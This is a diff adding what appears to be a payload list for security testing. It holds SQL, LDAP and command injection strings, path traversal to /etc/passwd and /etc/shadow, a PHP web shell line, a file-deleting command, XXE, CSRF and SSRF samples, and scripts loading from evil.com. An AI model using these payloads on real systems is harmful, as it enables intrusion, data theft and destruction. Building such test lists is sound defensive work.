@@ -1,0 +1,32 @@
+' OR 1=1 --'
+" OR ""="
+
+<script>alert('XSS')</script>
+<img src="x" onerror="alert('XSS')">
+
+;ls
+&& cat /etc/passwd
+
+../../etc/passwd
+../../../etc/shadow
+
+<?php echo system($_GET['cmd']); ?>
+$(rm /important/file.txt)
+
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com/evil.dtd"> ]><foo>&xxe;</foo>
+
+<img src="http://evil.com/transfer?amount=1000&account=attacker" style="display:none;">
+<form action="http://bank.com/transfer" method="POST"><input type="hidden" name="amount" value="1000"><input type="hidden" name="account" value="attacker"></form>
+
+http://localhost/admin
+http://example.com/internal/resource?file=/etc/passwd
+
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+%n%n%n%n%n%n%n%n%n%n
+
+<script src="http://evil.com/steal.js"></script>
+<img src="//legit-site.com/profile-pic.jpg" onerror="alert('XSSI')"> 
+
+*)(cn=*))(|(uid=*
+*)(&(objectClass=*
